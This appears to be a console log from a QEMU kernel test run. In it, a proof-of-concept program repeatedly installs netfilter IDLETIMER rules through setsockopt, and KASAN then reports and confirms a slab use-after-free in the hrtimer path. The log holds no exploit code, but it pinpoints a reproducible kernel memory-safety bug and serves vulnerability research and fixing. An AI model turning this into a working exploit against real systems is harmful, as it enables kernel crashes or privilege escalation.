[    1.104392]  ? translate_table+0xa8f/0x18a0
[    1.104559]  ? kfree+0x137/0x3b0
[    1.104693]  ? xt_check_entry_offsets+0x1dd/0x250
[    1.104880]  translate_table+0xb69/0x18a0
[    1.105043]  ? __kasan_kmalloc+0x8f/0xa0
[    1.105203]  ? __pfx_translate_table+0x10/0x10
[    1.105381]  ? xt_alloc_table_info+0x2b/0x80
[    1.105553]  do_ipt_set_ctl+0x630/0x13f0
[    1.105711]  ? _raw_spin_lock_bh+0x83/0xe0
[    1.105875]  ? __pfx__raw_spin_lock_bh+0x10/0x10
[    1.106064]  ? __pfx_do_ipt_set_ctl+0x10/0x10
[    1.106240]  ? do_ip_setsockopt+0x13dc/0x2f30
[    1.106415]  ? __pfx_do_ip_setsockopt+0x10/0x10
[    1.106596]  ? __pfx_sock_has_perm+0x10/0x10
[    1.106770]  nf_setsockopt+0x74/0xd0
[    1.106916]  raw_setsockopt+0x7c/0x200
[    1.107070]  ? __pfx_raw_setsockopt+0x10/0x10
[    1.107244]  do_sock_setsockopt+0xb2/0x160
[    1.107409]  __sys_setsockopt+0xdd/0x140
[    1.107567]  __x64_sys_setsockopt+0xb8/0x150
[    1.107739]  ? fpregs_assert_state_consistent+0x5e/0xf0
[    1.107945]  do_syscall_64+0xfc/0x580
[    1.108098]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.108298] RIP: 0033:0x43b14a
[    1.108425] Code: 77 06 c3 0f 1f 44 00 00 48 c7 c2 b8 ff ff ff f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 49 89 ca b8 36 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 06 c3 0f 1f 44 00 00 48 c7 c2 b8 ff ff ff f7
[    1.109140] RSP: 002b:00007ffef36bf808 EFLAGS: 00000246 ORIG_RAX: 0000000000000036
[    1.109434] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 000000000043b14a
[    1.109712] RDX: 0000000000000040 RSI: 0000000000000000 RDI: 0000000000000003
[    1.109990] RBP: 0000000000000003 R08: 0000000000000390 R09: 00000000004a67e0
[    1.110274] R10: 0000000030965ac0 R11: 0000000000000246 R12: 00007ffef36bf900
[    1.110552] R13: 0000000000000048 R14: 0000000000000000 R15: 0000000030965ac0
[    1.110832]  </TASK>
[    1.110925] ---[ end trace 0000000000000000 ]---
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: rev0 reuse rc=0 ok
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: install rev=0 std=152 idle=184 err=176 total=816 rc=0 errno=0
poc: done — expect debugobjects WARN / panic in mod_timer
[    1.151204] poc (67) used greatest stack depth: 25712 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    1.169056] ==================================================================
[    1.169355] BUG: KASAN: slab-use-after-free in __hrtimer_run_queues+0x5e6/0x780
[    1.169641] Read of size 8 at addr ffff888006b2d450 by task swapper/1/0
[    1.169896] 
[    1.169966] CPU: 1 UID: 0 PID: 0 Comm: swapper/1 Tainted: G        W           7.0.0-rc2-00306-g6dcee8496d53-dirty #1 PREEMPT(lazy) 
[    1.169968] Tainted: [W]=WARN
[    1.169969] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.169970] Call Trace:
[    1.169972]  <IRQ>
[    1.169973]  dump_stack_lvl+0x53/0x70
[    1.169977]  print_report+0xce/0x650
[    1.169980]  ? __hrtimer_run_queues+0x5e6/0x780
[    1.169981]  kasan_report+0xce/0x100
[    1.169982]  ? __hrtimer_run_queues+0x5e6/0x780
[    1.169983]  __hrtimer_run_queues+0x5e6/0x780
[    1.169985]  ? __pfx___hrtimer_run_queues+0x10/0x10
[    1.169986]  ? ktime_get_update_offsets_now+0x7c/0x2c0
[    1.169988]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
[    1.169990]  hrtimer_interrupt+0x2c9/0x750
[    1.169992]  __sysvec_apic_timer_interrupt+0x88/0x2d0
[    1.169994]  sysvec_apic_timer_interrupt+0x67/0x80
[    1.169997]  </IRQ>
[    1.169997]  <TASK>
[    1.169998]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[    1.169999] RIP: 0010:pv_native_safe_halt+0xf/0x20
[    1.170001] Code: 66 ac 00 e9 83 1b 02 00 0f 1f 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa eb 07 0f 00 2d 83 8a 1d 00 fb f4 <c3> cc cc cc cc 66 2e 0f 1f 84 00 00 00 00 00 66 90 90 90 90 90 90
[    1.170002] RSP: 0018:ffffc9000014fe60 EFLAGS: 00000206
[    1.170005] RAX: ffff8880e762c000 RBX: 0000000000000001 RCX: ffffffff83c7b9f1
[    1.170006] RDX: ffffed100da66243 RSI: 0000000000000004 RDI: 0000000000001264
[    1.170006] RBP: ffffed1000c6c460 R08: 0000000000000001 R09: ffffed100da66242
[    1.170007] R10: ffff88806d331213 R11: ffff88806d335cd8 R12: ffff888006362300
[    1.170008] R13: ffffffff85014350 R14: 1ffff92000029fd2 R15: 0000000000000000
[    1.170008]  ? ct_kernel_exit.constprop.0+0xa1/0xc0
[    1.170010]  default_idle+0x9/0x10
[    1.170011]  default_idle_call+0x39/0x60
[    1.170012]  do_idle+0x356/0x4d0
[    1.170014]  ? __pfx_do_idle+0x10/0x10
[    1.170016]  cpu_startup_entry+0x4f/0x60
[    1.170017]  start_secondary+0x1b3/0x210
[    1.170019]  common_startup_64+0x13e/0x148
[    1.170021]  </TASK>
[    1.170022] 
[    1.177499] Allocated by task 67:
[    1.177633]  kasan_save_stack+0x33/0x60
[    1.177788]  kasan_save_track+0x14/0x30
[    1.177942]  __kasan_kmalloc+0x8f/0xa0
[    1.178095]  idletimer_tg_checkentry_v1+0x368/0xbc0
[    1.178291]  xt_check_target+0x1f5/0x8e0
[    1.178448]  find_check_entry.constprop.0+0x6e8/0x9b0
[    1.178649]  translate_table+0xb69/0x18a0
[    1.178810]  do_ipt_set_ctl+0x630/0x13f0
[    1.178967]  nf_setsockopt+0x74/0xd0
[    1.179115]  raw_setsockopt+0x7c/0x200
[    1.179266]  do_sock_setsockopt+0xb2/0x160
[    1.179431]  __sys_setsockopt+0xdd/0x140
[    1.179588]  __x64_sys_setsockopt+0xb8/0x150
[    1.179761]  do_syscall_64+0xfc/0x580
[    1.179908]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.180106] 
[    1.180173] Freed by task 12:
[    1.180295]  kasan_save_stack+0x33/0x60
[    1.180449]  kasan_save_track+0x14/0x30
[    1.180602]  kasan_save_free_info+0x3b/0x60
[    1.180769]  __kasan_slab_free+0x43/0x70
[    1.180925]  kfree+0x137/0x3b0
[    1.181054]  cleanup_entry+0x230/0x350
[    1.181204]  __ipt_unregister_table+0x95/0x1a0
[    1.181381]  ops_undo_list+0x255/0x700
[    1.181532]  cleanup_net+0x38c/0x770
[    1.181676]  process_one_work+0x5bf/0x1090
[    1.181838]  worker_thread+0x4bb/0xd00
[    1.181988]  kthread+0x2dc/0x3c0
[    1.182122]  ret_from_fork+0x3c9/0x640
[    1.182272]  ret_from_fork_asm+0x1a/0x30
[    1.182429] 
[    1.182496] The buggy address belongs to the object at ffff888006b2d400
[    1.182496]  which belongs to the cache kmalloc-256 of size 256
[    1.182979] The buggy address is located 80 bytes inside of
[    1.182979]  freed 256-byte region [ffff888006b2d400, ffff888006b2d500)
[    1.183450] 
[    1.183518] The buggy address belongs to the physical page:
[    1.183738] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0xffff888006b2dc00 pfn:0x6b2c
[    1.184093] head: order:1 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    1.184387] flags: 0x100000000000240(workingset|head|node=0|zone=1)
[    1.184631] page_type: f5(slab)
[    1.184759] raw: 0100000000000240 ffff888006041b40 ffff888006040490 ffff888006040490
[    1.185059] raw: ffff888006b2dc00 000000000010000e 00000000f5000000 0000000000000000
[    1.185357] head: 0100000000000240 ffff888006041b40 ffff888006040490 ffff888006040490
[    1.185657] head: ffff888006b2dc00 000000000010000e 00000000f5000000 0000000000000000
[    1.185958] head: 0100000000000001 ffffea00001acb01 00000000ffffffff 00000000ffffffff
[    1.186261] head: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[    1.186561] page dumped because: kasan: bad access detected
[    1.186777] 
[    1.186844] Memory state around the buggy address:
[    1.187032]  ffff888006b2d300: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.187312]  ffff888006b2d380: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.187590] >ffff888006b2d400: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.187869]                                                  ^
[    1.188097]  ffff888006b2d480: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.188375]  ffff888006b2d500: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.188654] ==================================================================
[    1.188932] Disabling lock debugging due to kernel taint
[    1.452755] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    2.432701] ACPI: PM: Preparing to enter system sleep state S5
[    2.433226] reboot: Power down
CONFIRMED: KASAN_UAF
